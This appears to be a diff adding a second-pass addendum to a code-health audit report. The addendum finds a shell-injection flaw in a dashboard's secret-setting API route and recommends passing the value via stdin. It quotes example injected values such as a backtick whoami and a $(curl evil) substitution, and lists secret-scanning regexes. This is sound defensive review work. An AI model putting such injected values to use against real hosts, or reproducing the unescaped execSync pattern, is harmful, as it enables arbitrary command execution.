@@ -87,3 +87,33 @@ Grep for `^\s*//\s*(if|for|while|return|const|let|var|function|import|export|awa
 ---
 
 **CODE_HEALTH_OK** — 1 repo audited, 0 TODO markers, 0 secrets, 1 file >500 lines (unchanged), 3 `as any` casts (unchanged), test coverage gap on dashboard/a2a-server/mcp-server unchanged from 2026-04-25 and remains P1.
+
+---
+
+## Addendum — second pass, 14:50 UTC
+
+Re-run for completeness. Findings above stand. One new defense-in-depth finding the morning sweep missed:
+
+### Shell-injection vector — `dashboard/app/api/secrets/route.ts:96`
+
+```ts
+execSync(`gh secret set ${name} -b "${value.replace(/"/g, '\\"')}"`, { ... })
+```
+
+`name` is regex-validated by `VALID_SECRET_NAME` (safe). The secret `value` is interpolated into the shell command with only `"` escaped. Backticks, `$(…)`, and `\` survive the substitution — a value containing `` `whoami` `` or `$(curl evil)` would execute on the host running the dashboard.
+
+Exposure is bounded — the dashboard is operator-local and the input is the operator's own keystroke — so this is defense-in-depth, not an exploitable production hole. Worth fixing because the right pattern is already in this codebase: `dashboard/app/api/auth/route.ts:46-49` writes the secret value through `execSync({ input: key })` (stdin) rather than the shell. Dropping the manual quote-escape and using `input:` for the value removes the entire class.
+
+**Recommendation:** rewrite line 96 as `execSync(\`gh secret set ${name}\`, { input: value, stdio: ['pipe', 'pipe', 'pipe'], cwd: process.cwd() })`. Two-line change, no new dependencies, eliminates the only shell-injection surface in the dashboard tree.
+
+`app/api/secrets/route.ts:119` (`gh secret delete ${name}`) is safe — `name` is validated and there is no value field.
+
+### Other re-run notes
+
+- Wider `(api[_-]?key|secret|password|token)` regex at 16+ chars: still 0 hits in the source tree.
+- `console.log` / `debugger` in `*.{ts,tsx,js}`: 0 hits.
+- Long block-comment scan (`^\s*/\*[\s\S]+?\*/`): 0 commented-out logic blocks.
+- `eval(` / `new Function(`: 0 hits.
+- All 9 `execSync` call sites in the dashboard re-checked. Only `secrets/route.ts:96` interpolates user input into the shell command line.
+
+Net delta vs morning report: +1 actionable item (the `secrets/route.ts:96` rewrite). Coverage gap, large-file, and `as any` findings unchanged.
